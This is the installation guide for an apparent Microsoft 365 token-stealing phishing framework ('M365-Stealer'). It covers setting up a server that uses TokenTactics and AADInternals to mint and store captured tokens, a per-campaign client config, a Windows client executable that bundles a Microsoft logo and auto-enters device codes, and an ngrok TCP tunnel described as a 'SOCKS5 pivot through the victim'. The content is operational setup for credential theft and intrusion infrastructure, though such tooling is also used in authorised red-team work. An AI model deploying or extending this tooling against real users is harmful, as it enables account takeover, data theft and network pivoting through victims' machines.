# Installation

## Requirements

- Python 3.9+
- PowerShell 7 (`pwsh`) on the **server** (TokenTactics / AADInternals run through it)
- Docker + Docker Compose (for the containerized server)
- An ngrok account with TCP endpoints enabled (card verification required,
  not charged): <https://dashboard.ngrok.com/settings#id-verification>

## Local server

```bash
cd kodes
python -m venv .venv
source .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -r requirements.txt

python -m src.main server          # listens on 0.0.0.0:9000
```

First launch generates:

| File | Purpose |
|---|---|
| `config/secret.key` | Flask session secret (also printed once at first boot) |
| `config/crypto.key` | Fernet key encrypting all stored tokens; **back this up** |
| `database/kodes.db` | SQLite database |
| `database/TokenLog.log` | Raw token log written by TokenTactics |

> Losing `config/crypto.key` makes every stored token undecryptable. Tokens
> can be re-imported from `database/TokenLog.log` (see FAQ).

## Docker server

```bash
git clone https://github.com/<your-org>/RinP-Kodes-M365-Stealer.git
cd RinP-Kodes-M365-Stealer
docker compose up -d --build
```

Compose mounts:

- `./database:/app/database`: DB + TokenLog (persistent)
- `./kodes/config:/app/config`: secret + crypto keys (persistent)
- `./tokentactics`, `./aadinternals`: read-only module mounts

`TOKEN_LOG_PATH` must point inside the persistent volume
(`/app/database/TokenLog.log`); TokenTactics writes relative to its CWD.

## Client

```bash
python -m src.main client -c client.json
```

`client.json` (download per campaign from the panel):

```json
{
  "api_url": "http://SERVER:9000",
  "campaign_token": "b85fd288cd7b485f",
  "auth_site": "https://microsoft.com/devicelogin",
  "post_auth_url": null,
  "ngrok_token": "...",
  "health_check_interval": 30
}
```

Modes:

- GUI (default): Tk status window + auto code entry
- `--headless`: no GUI; device code is printed to console and copied to clipboard
- `--no-browser`: do not open the browser automatically

## Windows client build

```bat
pip install -r requirements.txt
pyinstaller build\client_build.spec
dist\kodes-client.exe -c client.json
```

The spec bundles `static/img/microsoft.png` and enters through
`client_entry.py` (package-relative imports). The client enables
per-monitor DPI awareness automatically, so image recognition works at
125 % / 150 % scaling. `locateOnScreen(confidence=…)` requires OpenCV,
which is in `requirements.txt` (`opencv-python-headless`).

## Firewall / network

| Direction | Port | Purpose |
|---|---|---|
| client → server | 9000/tcp | registration, device code, health check, tunnel URL |
| operator → server | 9000/tcp | panel |
| server → login.microsoftonline.com, graph.microsoft.com, *.sharepoint.com | 443 | token minting + data fetch |
| operator → `x.tcp.ngrok.io:PORT` | TCP | SOCKS5 pivot through the victim |

## References

- AADInternals: <https://github.com/Gerenios/AADInternals>
- AADInternals phishing: <https://aadinternals.com/post/phishing/>
- TokenTactics: <https://github.com/rvrsh3ll/TokenTactics> (vendored, v0.0.2)
